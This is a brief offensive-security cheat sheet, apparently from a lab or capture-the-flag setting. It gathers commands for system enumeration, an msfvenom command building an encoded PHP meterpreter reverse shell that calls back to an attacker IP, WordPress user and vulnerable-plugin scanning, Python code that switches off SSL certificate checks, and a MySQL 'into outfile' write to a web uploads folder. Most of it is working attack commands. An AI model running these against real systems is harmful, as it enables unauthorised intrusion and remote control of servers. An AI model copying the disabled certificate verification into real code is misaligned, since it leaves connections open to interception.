#Privilege Escalation
	1. uname -a
	2. cat /etc/*release*
	3. cat /etc/lsb-release

#Bind Shells


#Reverse Shells

#Reverse Shells using metasploit

  1. msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=1337 -e php/base64 > shell.php
      append <?php ?> in the shell.php file

#Wordpress Scanning
	1. wpscan --url https://10.0.2.9:12038/blogblog --enumerate uvp
    u : enumerate usernames 
    vp : vulnerable plugins
    
#Changing a python urllib2.urlopen method to work with ssl

	1. 
		import ssl 
		ctx = ssl.create_default_context()
		ctx.check_hostname = False
		ctx.verify_mode = ssl.CERT_NONE

		urllib2.urlopen(----- , context = ctx)

#After getting access to mysql command line remotely

	1. Creating a file onto the remote server
		mysql> select "baba" into outfile "/var/www/html/somepath/wp-content/uploads/test.txt";
    
